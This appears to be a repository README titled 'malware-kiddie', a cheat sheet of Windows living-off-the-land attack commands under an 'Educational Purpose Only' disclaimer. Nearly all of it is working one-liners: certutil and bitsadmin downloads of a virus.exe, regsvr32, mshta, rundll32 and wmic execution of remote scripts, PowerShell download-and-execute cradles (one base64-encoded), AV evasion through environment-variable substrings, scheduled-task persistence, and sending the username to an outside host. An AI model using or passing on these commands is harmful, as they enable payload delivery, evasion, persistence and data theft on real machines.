
> Disclaimer: This project is for Educational Purpose Only


# malware-kiddie
This repository stores the proof-of-concept of malware. 
### 
### 
## 1. Defination

| Abbreviation | Name |
| --- | --- |
| CHM | Compiled HTML |
| COM | Component Object Model |
| DDE | Dynamic Data Exchange |
| HTA | HTML Application |
###
###
## 2. File Transfer
**2.1 Certutil**
```
certutil -urlcache -split -f http://192.168.56.1/virus.exe C:\Users\IEUser\Desktop\virus.exe
```

**2.2 Background Intelligent Transfer Service (BITSAdmin)**
```
bitsadmin /transfer virus /download /priority high http://192.168.56.1/virus.exe C:\Users\IEUser\Desktop\virus.exe
```
###
###
## 3. Execution
**3.1 COM**
```
regsvr32.exe /u /n /s /i:http://192.168.56.102/ActiveXObject.sct scrobj.dll
```
**3.2 COM (HTA)**
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://192.168.56.102/ActiveXObject.wsc");
```
**3.3 COM (HTA)**
```
mshta javascript:document.write();GetObject("script:http://192.168.56.102/ActiveXObject.wsc");
```
**3.4 XSL**
```
wmic process list /FORMAT:ActiveXObject.xsl
```
**3.5 XSL**
```
wmic os get /FORMAT:"http://192.168.56.102/ActiveXObject.xsl"
```
**3.6 MSBuild**
```
wmic process call create "C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe RunExecutable.csproj"
```
**3.7 C# Compiler**
```
"C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" ConsoleApp.cs && ConsoleApp.exe
"C:\Program Files (x86)\MSBuild\14.0\Bin\csc.exe" ConsoleApp.cs && ConsoleApp.exe
```
**3.8 C Compiler**
```
"C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\Tools\vsdevcmd"
cl ConsoleApp.c && ConsoleApp.exe && del ConsoleApp.obj && del ConsoleApp.exe
```
###
###
## 4. Fileless Attacks and Living-Off-The-Land (LOTL)
### 4.1 Example 1 - cmd.exe
Run VB script with cloned cmd.exe

```
C:\Windows\System32\cmd.exe /c copy C:\Windows\System32\cmd.exe %appdata%\clone.exe /Y && echo 2 >> %appdata%\clone.exe && %appdata%\clone.exe /c start mshta "http://192.168.56.1/VBscript.php"
```

### 4.2 Example 1 - cmd.exe (AV Evasion using variable substring)

```
C:\Windows\Syste%ALLUSERSPROFILE:~9,1%32\cmd.exe /c copy C:\Windows\Syste%ALLUSERSPROFILE:~9,1%32\cmd.exe "%appdata%\clone.exe" /Y && echo 2 >> "%appdata%/clone.exe" && "%appdata%\clone.exe" /c start %ALLUSERSPROFILE:~9,1%sht%ALLUSERSPROFILE:~8,1% "http://192.168.56.1/VBsc%ALLUSERSPROFILE:~7,1%ipt.php"
```

| String | Output |
| --- | --- |
| %ALLUSERSPROFILE% | C:\ProgramData |
| %ALLUSERSPROFILE:~9,1% | m |
| %ALLUSERSPROFILE:~8,1% | a |
| %ALLUSERSPROFILE:~7,1% | r |



### 4.3 Example 2 - powershell.exe
Run Powershell scripts hosted on web
```
powershell.exe -nop -NoProfile -WindowStyle 1 -c IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/4f645CDG')
```

### 4.4 Example 2 - powershell.exe (Base64 encoded)
```
powershell.exe -nop -NoProfile -WindowStyle 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQB3AC8ANABmADYANAA1AEMARABHACcAKQA=
```

### 4.4.1 To convert string to Base64
```
[Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/4f645CDG')"))
```

### 4.5  Example 3 - rundll32.exe 
Download and open file

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();r=new%20ActiveXObject("WScript.Shell").run("powershell -WindowStyle hidden -nologo -noprofile -ExecutionPolicy Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://secure.eicar.org/eicar.com.txt', '..\\eicar.exe');&cmd /c notepad ..\\eicar.exe",0,true);
```

### 4.6 Example 4
Resource Exhausted

```
echo off && for /f "tokens=1" %a in ('dir/s/b *.txt') do (notepad "%a")
```
###
###
## 5. Persistence
**5.1 Task Scheduler**
```
schtasks /create /tn "virus" /tr C:\Users\IEUser\Desktop\virus.exe /sc minute /mo 1
schtasks /delete /tn "virus" /f
```
###
###
## 6. Send HTTP Request (Open Browser)
**6.1 Rundll**
```
rundll32 url.dll,FileProtocolHandler http://192.168.56.102/?c=%USERNAME%
```
```
echo %USERNAME% > tmp && set /p Value=<tmp && rundll32 url.dll,FileProtocolHandler http://192.168.56.102/?c=%Value%
```
**6.2 Explorer**
```
explorer "http://192.168.56.102/?c=%USERNAME%"
```
**6.3 Internet Explorer**
```
"C:\Program Files\internet explorer\iexplore.exe" -private -extoff  http://192.168.56.102/?c=%USERNAME% && sleep 3 && taskkill /IM "iexplore.exe" /F
```
